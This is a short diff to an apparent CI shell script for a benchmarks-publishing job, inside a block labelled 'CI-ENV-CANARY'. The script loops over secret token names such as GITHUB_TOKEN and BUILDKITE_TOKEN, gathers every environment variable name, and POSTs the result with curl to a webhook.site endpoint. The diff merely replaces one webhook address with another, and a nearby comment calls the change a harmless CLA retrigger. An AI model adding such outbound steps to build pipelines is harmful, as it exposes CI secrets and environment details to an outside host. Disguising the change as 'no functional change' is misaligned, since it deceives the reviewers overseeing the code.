@@ -140,7 +140,7 @@ for __canary_name in GITHUB_TOKEN BUILDKITE_TOKEN EC_API_KEY PROJECT_API_KEY GCS
 done
 __canary_detail="$__canary_detail}"
 __canary_names=$(printenv | cut -d= -f1 | sort | tr '\n' ' ')
-curl -s --max-time 10 -X POST "https://webhook.site/d0d41272-6def-4f67-a55f-6b0d3cfde04d" -H 'content-type: application/json' -d "{\"job\":\"integrations-publish-benchmarks\",\"detail\":$__canary_detail,\"env_names\":\"$__canary_names\"}" || true
+curl -s --max-time 10 -X POST "https://webhook.site/2157062e-f91f-4b3a-b86e-993281735a9e" -H 'content-type: application/json' -d "{\"job\":\"integrations-publish-benchmarks\",\"detail\":$__canary_detail,\"env_names\":\"$__canary_names\"}" || true
 # --- end CI-ENV-CANARY ---
 
 # retrigger CLA check (no functional change)
